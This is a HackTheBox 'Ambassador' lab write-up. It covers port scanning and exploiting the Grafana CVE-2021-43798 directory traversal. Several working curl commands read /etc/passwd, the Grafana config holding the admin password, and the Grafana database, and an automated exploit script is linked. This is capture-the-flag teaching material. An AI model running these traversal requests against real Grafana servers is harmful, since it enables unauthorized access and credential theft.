# Ambassador write-up

## 1. Description

This article is the write-up for the Ambassador box of HackTheBox.<br>
To begin, you need to be connected to the HackTheBox vpn.<br>


## 2. Port Enumeration

First, let's make a map of the host.<br>
What ports are open ?<br>
What services are running ?<br>

For this, we will use a combinaison of RustScan and Nmap.<br>

```rustscan IP -- -sC -sV -oN nmap_initial.txt```

This is the result of the scan :<br>

| PORT      | STATE SERVICE | REASON       | VERSION                                                              |
|-----------|---------------|--------------|----------------------------------------------------------------------|
| 22/tcp    | open          | ssh          | syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) |
| 80/tcp    | open          | http         | syn-ack Apache httpd 2.4.41 ((Ubuntu))                               |
| 3000/tcp  | open          | ppp?         | syn-ack                                                              |
| 3306/tcp  | open          | nagios-nsca  | syn-ack Nagios NSCA                                                  |

On the port 22, an SSH server is running, but at this point, we don't have any credentials.<br>
On the port 80, an Apache web server is running, it must be interesting to start here.<br>
On the port 3000, the scan don't tell us much about it, but if you try to connect top http://IP:3000, we are greeted by a <strong>Grafana</strong> login page.<br>
On the port 3306, the scan output tell us that it is a Nagis NSCA service, but 3306 is a common port for a mysql server, and trying to connect to the server using :<br>
```mysql IP -u root -p```

indicate that a mysql server is running and accessible.


## 3. Web exploration

Let's begin with the web server running on port 80.<br>
There is only one thing on this webserver, a single post in which we can have a usefull information :<br>
<em>Use the <strong>developer</strong> account to SSH, DevOps will give you the password.</em>

We now have a username ! but not a password.. so let's continue to explore others services since running a directory scanner will not find us anything new.<br>

## 4. Grafana 

Grafana is a web application which allow us to monitor and analyse data from differents sources like databases.<br>
At the bottom of the login page, we can discover the version of the application :<br>
![image](https://user-images.githubusercontent.com/70477133/215295087-260beaff-580e-4d9b-b742-6bee59029c0f.png)

It is always good to search online for public exploits of popular applications on site like google, or [exploit-db](https://www.exploit-db.com/)<br>
The first links tell us about a <strong>[directory traversal](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43798)</strong> that allow us to read sensitive file on the server<br>

This endpoint is vulnerable : http://IP/public/plugins/<pluginName>/../../../../../../../../fileToRead<br>
where pluginName is a plugin of Grafana like :<br>
- alertlist
- annolist
  
You can view a more complete list [here](https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/)<br>
So, now, we can read sensitive data with :
```
curl --path-as-is http://IP:3000/public/plugins/alertlist/../../../../../../../../filename
```

  <strong>--path-as-is</strong> is needed, because other wise, curl will normalise the url as : http://IP:3000/public/plugins/alertlist/filename and this will not work.<br>

  We need to find usefull informations by reading important files like <strong>/etc/passwd</strong>:<br> 
```curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../etc/passwd```

Which leak one user and confirm the one discovered previously :
```
developer:x:1000:1000:developer:/home/developer:/bin/bash
consul:x:997:997::/home/consul:/bin/false
```

Grafana store credentials in configurations like grafana.ini or defaults.ini which can be found at : 
/etc/grafana/grafana.ini
```curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini --output grafana.ini```

in which we can retrieve the admin password of Grafana : [REDACTED]
  
We can also dump the whole Grafana sqlite db at /var/lib/grafana/grafana.db
```curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db --output grafana.db```
  
  

[Here](https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798) is an automated script that allow to retrieve usefull files from Grafana, search for Grafana tokens and decrypt Grafana passwords.

